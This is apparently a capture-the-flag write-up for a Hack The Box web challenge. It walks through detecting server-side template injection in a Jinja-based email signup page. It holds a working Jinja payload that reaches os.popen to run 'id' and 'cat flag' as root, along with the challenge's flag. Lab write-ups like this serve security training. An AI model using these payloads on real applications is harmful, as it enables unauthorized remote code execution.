>Navigate through layers of code to unlock hidden potential. Do you have the skill to tweak the fabric of scripts and uncover secret messages? Gear up for a puzzle-packed adventure. Let the discovery begin!

![[Pasted image 20250327072034.png]]

We arrive at a simple page with a field to input an email. Being that it seems to be a blog about the Jinja template engine, I might assume that the page is using Jinja or a similar technology to update dynamically with user input, like when we submit an email:

![[Pasted image 20250327072348.png]]

Our input doesn't even need to be in the form of an email address -- this may already hint that the application is lacking validation protections.
![[Pasted image 20250327072924.png]]

From HTB's module on Server-Side Attacks, I know that template engines like Jinja can be vulnerable to Server-side Template Injection (SSTI) when misconfigured and when user input is used without validation/sanitization.

To test for SSTI, we can use the following string to try causing an error for most template engines: `$&#123;&#123;<%[%'"}}%\.`

Instead of reflecting our input as in the previous images, the page now prints
`{"message":["unexpected '<'"],"status":"TemplateSyntaxError"} `
indicating it may be vulnerable to SSTI.

Next I'll try a payload meant for the syntax/language of Python/Jinja specifically, which will allow us Remote Code Execution (RCE), in this case running `id`:
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

We get:
`The email uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) is subscribed! 🥳`

This tells us that the web server is running root rather than an unprivileged service account, which is another vulnerability and means that we already have full control over the box.

However, in this case we don't need root privileges to find the flag; using the payload above to execute `ls`, I found that the flag was in the working directory, and can be retrieved with:
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}`

`HTB{r3nd3r_m3_vuln3r4bl3_a4916f45264fb24ae28ddc783bc6a551}`
